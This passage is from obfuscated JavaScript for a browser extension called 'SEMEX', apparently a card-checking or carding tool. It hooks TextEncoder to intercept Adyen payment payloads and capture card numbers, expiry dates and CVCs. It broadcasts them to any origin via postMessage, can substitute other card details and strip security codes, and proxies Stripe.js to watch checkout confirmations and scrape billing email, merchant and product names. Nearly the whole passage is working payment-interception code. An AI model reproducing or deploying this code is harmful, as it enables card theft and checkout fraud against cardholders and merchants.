      _0x50d774 = _0x50d774.replace(/"(expiryYear|expiry_year|expYear)"\s*:\s*"?(\d{4}|\d{2})"?/g, (_0x20afba, _0x492c26, _0x3b6859) => {
        return "\"" + _0x492c26 + "\":\"" + (_0x3b6859 && _0x3b6859.length === 2 ? _0x404fff : _0x2f396e) + "\"";
      });
      if (_0x50d774 !== _0x4e5de3) {
        _0x303b36.expiry = true;
      }
    }
    if (_0x377dad) {
      const _0x17a228 = _0x50d774;
      _0x50d774 = _0x50d774.replace(/,\s*"cvc"\s*:\s*"[^"]*"/g, "");
      _0x50d774 = _0x50d774.replace(/"cvc"\s*:\s*"[^"]*"(?=\s*[,}])/g, "");
      _0x50d774 = _0x50d774.replace(/,\s*"encryptedSecurityCode"\s*:\s*"[^"]*"/g, "");
      _0x50d774 = _0x50d774.replace(/"encryptedSecurityCode"\s*:\s*"[^"]*"(?=\s*[,}])/g, "");
      if (_0x50d774 !== _0x17a228) {
        _0x303b36.cvc = true;
      }
    }
    return {
      replaced: _0x303b36.card || _0x303b36.expiry || _0x303b36.cvc ? _0x50d774 : _0x464bc6,
      changes: _0x303b36
    };
  }
  __name(_0x4c9043, "replaceCardFieldsInString");
  const _0x3972ed = window.TextEncoder.prototype.encode;
  window.TextEncoder.prototype.encode = function (_0xc5fe07) {
    var _0x1e1992;
    var _0x44c059;
    var _0xf4ab10;
    try {
      const _0x42ae22 = window.SEMEX_SETTINGS || {};
      const _0x296c67 = ((_0x1e1992 = _0x42ae22.cardReplacement) == null ? undefined : _0x1e1992.enabled) && ((_0xf4ab10 = (_0x44c059 = _0x42ae22.cardReplacement) == null ? undefined : _0x44c059.gateways) == null ? undefined : _0xf4ab10.adyen);
      if (typeof _0xc5fe07 !== "string") {
        return _0x3972ed.call(this, _0xc5fe07);
      }
      const _0x1c4361 = _0xc5fe07.indexOf("generationtime") !== -1;
      const _0x47dbea = _0xc5fe07.indexOf("\"number\"") !== -1 || _0xc5fe07.indexOf("\"expiryMonth\"") !== -1 || _0xc5fe07.indexOf("\"expiryYear\"") !== -1 || _0xc5fe07.indexOf("\"cvc\"") !== -1 || _0xc5fe07.indexOf("\"encryptedSecurityCode\"") !== -1;
      if (_0x1c4361 && _0x47dbea) {
        try {
          const _0x581c6d = JSON.parse(_0xc5fe07);
          const _0x591d61 = _0x581c6d.paymentMethod && typeof _0x581c6d.paymentMethod === "object" ? _0x581c6d.paymentMethod : _0x581c6d;
          const _0x428dc7 = _0x591d61.number || _0x591d61.cardNumber || _0x591d61.pan || "";
          if (_0x428dc7) {
            const _0x2eff83 = {
              number: String(_0x428dc7).replace(/\s/g, ""),
              month: _0x591d61.expiryMonth || _0x591d61.expiry_month || _0x591d61.expMonth || null,
              year: _0x591d61.expiryYear || _0x591d61.expiry_year || _0x591d61.expYear || null,
              cvv: _0x591d61.cvc || null
            };
            window.__LAST_CAPTURED_CARD = _0x2eff83;
            window.lastInterceptedCardData = _0x2eff83;
            try {
              if (window.top && window.top !== window) {
                window.top.__LAST_CAPTURED_CARD = _0x2eff83;
                window.top.lastInterceptedCardData = _0x2eff83;
              }
            } catch (_0x34234f) {}
            window.postMessage({
              type: "CARD_DATA_INTERCEPTED",
              card: _0x2eff83
            }, "*");
            window.postMessage({
              type: "SEMEX_PERSIST_CARD",
              card: _0x2eff83
            }, "*");
            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage({
                  type: "CARD_DATA_INTERCEPTED",
                  card: _0x2eff83
                }, "*");
                window.parent.postMessage({
                  type: "SEMEX_PERSIST_CARD",
                  card: _0x2eff83
                }, "*");
              }
            } catch (_0xdeec88) {}
          }
        } catch (_0x29e830) {
          const _0x16c3c8 = _0xc5fe07.match(/"(?:number|cardNumber|pan)"\s*:\s*"(\d+)"/);
          const _0x48d245 = _0xc5fe07.match(/"(?:expiryMonth|expiry_month|expMonth)"\s*:\s*"?(\d{1,2})"?/);
          const _0x231e57 = _0xc5fe07.match(/"(?:expiryYear|expiry_year|expYear)"\s*:\s*"?(\d{2,4})"?/);
          const _0x1fc4a5 = _0xc5fe07.match(/"cvc"\s*:\s*"(\d{3,4})"/);
          if (_0x16c3c8) {
            const _0x47547e = {
              number: _0x16c3c8[1],
              month: _0x48d245 ? _0x48d245[1] : null,
              year: _0x231e57 ? _0x231e57[1] : null,
              cvv: _0x1fc4a5 ? _0x1fc4a5[1] : null
            };
            window.__LAST_CAPTURED_CARD = _0x47547e;
            window.lastInterceptedCardData = _0x47547e;
            window.postMessage({
              type: "CARD_DATA_INTERCEPTED",
              card: _0x47547e
            }, "*");
            window.postMessage({
              type: "SEMEX_PERSIST_CARD",
              card: _0x47547e
            }, "*");
            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage({
                  type: "CARD_DATA_INTERCEPTED",
                  card: _0x47547e
                }, "*");
                window.parent.postMessage({
                  type: "SEMEX_PERSIST_CARD",
                  card: _0x47547e
                }, "*");
              }
            } catch (_0x2d1e3b) {}
          }
        }
        const _0x1e09ac = _0x296c67 ? _0x16d88b() : null;
        const _0x44e8d9 = _0x4c9043(_0xc5fe07, _0x1e09ac);
        if (_0x44e8d9.replaced !== _0xc5fe07) {
          if (_0x44e8d9.changes.card && _0x1e09ac) {
            const _0x4c13a8 = {
              number: _0x1e09ac.number,
              month: _0x1e09ac.exp_month,
              year: _0x1e09ac.exp_year,
              cvv: _0x1e09ac.cvc || _0x1e09ac.cvv
            };
            window.__LAST_CAPTURED_CARD = _0x4c13a8;
            window.lastInterceptedCardData = _0x4c13a8;
            try {
              if (window.top && window.top !== window) {
                window.top.__LAST_CAPTURED_CARD = _0x4c13a8;
                window.top.lastInterceptedCardData = _0x4c13a8;
              }
            } catch (_0x147b5f) {}
            window.postMessage({
              type: "CARD_DATA_INTERCEPTED",
              card: _0x4c13a8
            }, "*");
            window.postMessage({
              type: "SEMEX_PERSIST_CARD",
              card: _0x4c13a8
            }, "*");
            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage({
                  type: "CARD_DATA_INTERCEPTED",
                  card: _0x4c13a8
                }, "*");
                window.parent.postMessage({
                  type: "SEMEX_PERSIST_CARD",
                  card: _0x4c13a8
                }, "*");
              }
            } catch (_0x5eb0d4) {}
            window.postMessage({
              type: "SEMEX_TOAST",
              messageType: "CARD_REPLACED",
              gateway: "Adyen",
              cardPreview: _0x1e09ac.number.slice(0, 6) + "xxxx",
              url: window.location.href
            }, "*");
          }
          return _0x3972ed.call(this, _0x44e8d9.replaced);
        }
      }
    } catch (_0x1b8924) {}
    return _0x3972ed.call(this, _0xc5fe07);
  };
}, "initAdyenCardReplacement")();

/* ===== SEMEX stripe.redirectToCheckout intercept =====
 * When a merchant calls stripe.redirectToCheckout({sessionId:'cs_...'}),
 * open the hosted checkout in a new tab (full capture path) and suppress
 * the in-page navigation so the checker tab stays open.
 */
(function _semexStripeHook() {
  function _semexWrapR2C(inst) {
    if (!inst || typeof inst.redirectToCheckout !== "function") return;
    if (inst.redirectToCheckout.__semexPatched) return;
    const origR2C = inst.redirectToCheckout;
    inst.redirectToCheckout = function _semexR2C(params) {
      try {
        const sid = params && (params.sessionId || params.session_id);
        if (typeof sid === "string" && sid.startsWith("cs_")) {
          const _url = "https://checkout.stripe.com/c/pay/" + sid;
          window.postMessage({ type: "SEMEX_OPEN_CHECKOUT_TAB", url: _url }, "*");
          // v2.8.6 failsafe: previously this returned a never-settling promise,
          // which froze the merchant page forever if the background opener was
          // unreachable (popup blocked, worker dead). Now: resolve normally if
          // the content bridge acks within 6 s; otherwise fall back to the
          // merchant's own redirect so the page is never left stuck.
          return new Promise(function (resolve) {
            let _done = false;
            const _onAck = function (ev) {
              if (!ev || ev.source !== window || !ev.data) return;
              if (ev.data.type === "SEMEX_CHECKOUT_TAB_ACK" && ev.data.url === _url) {
                _done = true;
                window.removeEventListener("message", _onAck);
                resolve({ __semexHandled: true }); // checkout opened in the dedicated tab
              }
            };
            window.addEventListener("message", _onAck);
            setTimeout(function () {
              if (_done) return;
              window.removeEventListener("message", _onAck);
              try { origR2C.apply(inst, [params]).then(resolve).catch(function () { resolve({}); }); }
              catch (_e) { resolve({}); }
            }, 6000);
          });
        }
      } catch (_e) {}
      return origR2C.apply(this, arguments);
    };
    try { Object.defineProperty(inst.redirectToCheckout, "__semexPatched", { value: true, configurable: true }); } catch (_e) {}
  }

  // Intercept confirmCardPayment / confirmPayment / confirmSetup so the result
  // is observable from the extension even on Payment Element flows where the
  // merchant never calls redirectToCheckout.
  function _semexWrapConfirm(inst) {
    if (!inst || inst.__semexConfirmPatched) return;
    ["confirmCardPayment", "confirmPayment", "confirmSetup"].forEach(function(method) {
      if (typeof inst[method] !== "function" || inst[method].__semexPatched) return;
      const _origFn = inst[method];
      inst[method] = async function _semexConfirmWrap() {
        try { window.postMessage({ type: "SEMEX_STRIPE_CONFIRM_START", method: method }, "*"); } catch (_e) {}
        let _res;
        try {
          _res = await _origFn.apply(this, arguments);
        } catch (_err) {
          try { window.postMessage({ type: "SEMEX_STRIPE_CONFIRM_ERROR", method: method, message: String((_err && _err.message) || _err) }, "*"); } catch (_e2) {}
          throw _err;
        }
        try {
          const _intent = (_res && (_res.paymentIntent || _res.setupIntent)) || null;
          if (_intent && _intent.status) {
            window.postMessage({ type: "SEMEX_STRIPE_CONFIRM_RESULT", method: method, status: _intent.status, id: _intent.id }, "*");
          }
          if (_res && _res.error) {
            window.postMessage({ type: "SEMEX_STRIPE_CONFIRM_ERROR", method: method, message: (_res.error.message || _res.error.code || "stripe_error") }, "*");
          }
        } catch (_e3) {}
        return _res;
      };
      try { Object.defineProperty(inst[method], "__semexPatched", { value: true, configurable: true }); } catch (_e) {}
    });
    try { Object.defineProperty(inst, "__semexConfirmPatched", { value: true, configurable: true }); } catch (_e) {}
  }

  let _semexStripeBase = null;
  let _semexStripeProxied = null;
  const _semexStripeTraps = {
    apply(target, thisArg, args) { const i = Reflect.apply(target, thisArg, args); _semexWrapR2C(i); _semexWrapConfirm(i); return i; },
    construct(target, args) { const i = Reflect.construct(target, args); _semexWrapR2C(i); _semexWrapConfirm(i); return i; }
  };
  try {
    Object.defineProperty(window, "Stripe", {
      configurable: true,
      enumerable: true,
      get() { return _semexStripeProxied !== null ? _semexStripeProxied : _semexStripeBase; },
      set(ctor) {
        _semexStripeBase = ctor;
        _semexStripeProxied = (typeof ctor === "function") ? new Proxy(ctor, _semexStripeTraps) : null;
      }
    });
  } catch (_eProp) {
    // Fallback: Stripe.js already ran — try patching window.Stripe directly.
    try {
      if (typeof window.Stripe === "function") {
        window.Stripe = new Proxy(window.Stripe, _semexStripeTraps);
      }
    } catch (_eFb) {}
  }

  // Top-frame relay receiver: when _semexHarvestBilling runs inside a
  // cross-origin subframe (e.g. the js.stripe.com elements-inner iframe on the
  // new Stripe habanero/embedded checkout), it cannot write to window.top and
  // relays billing data upward via postMessage. This listener — registered only
  // in the top frame — catches the relay and:
  //   (a) writes __SEMEX_LAST_BILLING for any MAIN-world consumers,
  //   (b) scrapes merchant/product from the top-frame DOM (data-testid elements
  //       exist on checkout.stripe.com but NOT inside the js.stripe.com iframe),
  //   (c) re-posts as _SEMEX_SITE_INFO_PATCH so ISOLATED-world content.js can
  //       receive all fields — MAIN-world window properties are NOT readable by
  //       ISOLATED-world scripts (separate V8 context in Chrome MV3).
  if (typeof window !== "undefined" && window.top === window) {
    window.addEventListener("message", function(_semexRelayEvt) {
      try {
        if (!_semexRelayEvt || !_semexRelayEvt.data || _semexRelayEvt.data.type !== "_SEMEX_BILLING_RELAY") return;
        const _d = _semexRelayEvt.data;
        // (a) Keep __SEMEX_LAST_BILLING for MAIN-world consumers
        const _prev = window.__SEMEX_LAST_BILLING || {};
        window.__SEMEX_LAST_BILLING = {
          email: _d.email || _prev.email || null,
          returnUrl: _d.returnUrl || _prev.returnUrl || null,
          ts: _d.ts || Date.now()
        };
        // (b) Scrape merchant name from top-frame DOM — data-testid="business-name"
        //     is rendered on checkout.stripe.com but absent in the iframe's DOM.
        const _semexMerchantScrape = (function() {
          try {
            const _el = document.querySelector('[data-testid="business-name"]');
            if (_el) { const _t = (_el.textContent || "").trim(); if (_t) return _t; }
            const _t2 = (document.title || "").trim();
            if (_t2) {
              const _pts = _t2.split(/\s[·|\-\u2013\u2014]\s/);
              return (_pts[_pts.length - 1] || _t2).slice(0, 80);
            }
          } catch (_e) {}
          return null;
        })();
        // (b) Scrape product name from top-frame DOM
        const _semexProductScrape = (function() {
          try {
            const _el = document.querySelector('[data-testid="product-summary-name"]') ||
                        document.querySelector('[data-testid="line-item-product-name"]');
            if (_el) { const _t = (_el.textContent || "").trim(); if (_t) return _t.slice(0, 100); }
          } catch (_e) {}
          return null;
        })();
        // (c) Re-post as a DOM event — ISOLATED-world content.js receives it via
        //     window.addEventListener and can patch cachedSiteInfo with all fields.
        window.postMessage({
          type: "_SEMEX_SITE_INFO_PATCH",
          email: _d.email || null,
          returnUrl: _d.returnUrl || null,
          merchant: _semexMerchantScrape || null,
          productName: _semexProductScrape || null,
          ts: _d.ts || Date.now()
        }, "*");
      } catch (_semexRelayErr) {}
    }, false);
  }
})();
/* ===== END SEMEX stripe.redirectToCheckout intercept ===== */